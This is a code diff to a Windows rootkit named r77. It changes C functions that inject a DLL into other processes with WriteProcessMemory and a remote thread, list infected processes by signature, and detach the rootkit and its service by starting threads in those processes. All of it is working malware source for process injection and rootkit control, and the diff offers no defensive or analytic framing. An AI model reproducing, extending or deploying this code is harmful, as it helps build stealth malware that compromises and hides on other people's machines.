@@ -51,7 +51,7 @@ BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize)
 								if (WriteProcessMemory(process, allocatedMemory, dll, dllSize, NULL))
 								{
 									HANDLE thread = NULL;
-									if (NT_SUCCESS(R77_NtCreateThreadEx(&thread, 0x1fffff, NULL, process, allocatedMemory + entryPoint, allocatedMemory, 0, 0, 0, 0, NULL)) && thread)
+									if (NT_SUCCESS(R77_NtCreateThreadEx(&thread, 0x1fffff, NULL, process, allocatedMemory + entryPoint, allocatedMemory, 0, 0, 0, 0, NULL)))
 									{
 										if (WaitForSingleObject(thread, 100) == WAIT_OBJECT_0)
 										{
@@ -121,7 +121,7 @@ BOOL GetR77Processes(PR77_PROCESS r77Processes, LPDWORD count)
 								{
 									r77Processes[actualCount].ProcessId = processes[i];
 									r77Processes[actualCount].Signature = signature;
-									r77Processes[actualCount++].DetachAddress = signature == R77_SIGNATURE ? *(DWORD64*)&moduleBytes[sizeof(IMAGE_DOS_HEADER) + 2] : 0;
+									r77Processes[actualCount++].DetachAddress = signature == R77_SIGNATURE || signature == R77_SERVICE_SIGNATURE ? *(DWORD64*)&moduleBytes[sizeof(IMAGE_DOS_HEADER) + 2] : 0;
 								}
 								else
 								{
@@ -156,7 +156,7 @@ BOOL DetachInjectedProcess(PR77_PROCESS r77Process)
 		{
 			// R77_PROCESS.DetachAddress is a function pointer to DetachRootkit()
 			HANDLE thread = NULL;
-			if (NT_SUCCESS(R77_NtCreateThreadEx(&thread, 0x1fffff, NULL, process, (LPVOID)r77Process->DetachAddress, NULL, 0, 0, 0, 0, NULL)) && thread)
+			if (NT_SUCCESS(R77_NtCreateThreadEx(&thread, 0x1fffff, NULL, process, (LPVOID)r77Process->DetachAddress, NULL, 0, 0, 0, 0, NULL)))
 			{
 				result = TRUE;
 				CloseHandle(thread);
@@ -207,20 +207,29 @@ VOID DetachAllInjectedProcesses()
 
 	FREE(r77Processes);
 }
-VOID TerminateR77Service(DWORD excludedProcessId)
+BOOL DetachR77Service()
 {
+	BOOL result = FALSE;
 	PR77_PROCESS r77Processes = NEW_ARRAY(R77_PROCESS, 1000);
 	DWORD r77ProcessCount = 1000;
+
 	if (GetR77Processes(r77Processes, &r77ProcessCount))
 	{
 		for (DWORD i = 0; i < r77ProcessCount; i++)
 		{
-			if (r77Processes[i].Signature == R77_SERVICE_SIGNATURE && r77Processes[i].ProcessId != excludedProcessId)
+			if (r77Processes[i].Signature == R77_SERVICE_SIGNATURE)
 			{
-				HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, r77Processes[i].ProcessId);
+				HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, r77Processes[i].ProcessId);
 				if (process)
 				{
-					TerminateProcess(process, 0);
+					// R77_PROCESS.DetachAddress is a function pointer to DetachService()
+					HANDLE thread = NULL;
+					if (NT_SUCCESS(R77_NtCreateThreadEx(&thread, 0x1fffff, NULL, process, (LPVOID)r77Processes[i].DetachAddress, NULL, 0, 0, 0, 0, NULL)))
+					{
+						result = TRUE;
+						CloseHandle(thread);
+					}
+
 					CloseHandle(process);
 				}
 			}
@@ -228,4 +237,5 @@ VOID TerminateR77Service(DWORD excludedProcessId)
 	}
 
 	FREE(r77Processes);
+	return result;
 }
